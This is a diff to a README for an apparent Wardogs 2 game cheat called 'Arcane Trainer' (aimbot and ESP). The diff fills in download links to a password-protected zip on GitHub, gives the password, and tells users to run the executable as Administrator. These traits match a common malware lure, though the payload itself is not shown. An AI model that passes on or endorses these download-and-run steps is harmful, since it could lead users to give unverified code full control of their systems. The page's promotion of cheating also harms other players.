@@ -2,7 +2,7 @@
 Arcane Trainer External for Wardogs 2 Cheat. Aim.ESP
 
 
-**[Download]()**
+## [Download](https://github.com/upperfiremanblaze/Wardogs2-Arcane-Trainer-Mod-Menu/releases/download/Download/Arcane-Trainer-2026.zip)
 > **Archive password**: `arcane`
 
 
@@ -60,7 +60,7 @@ Arcane Trainer External for Wardogs 2 Cheat. Aim.ESP
 
 ## 📥 Installation
 
-1. **[Download]()** the latest Arcane Trainer
+1. # [Download](https://github.com/upperfiremanblaze/Wardogs2-Arcane-Trainer-Mod-Menu/releases/download/Download/Arcane-Trainer-2026.zip) the latest Arcane Trainer
 2. Extract the archive to any folder
 3. Run `ArcaneExternal.exe` as Administrator
 4. Follow on-screen instructions
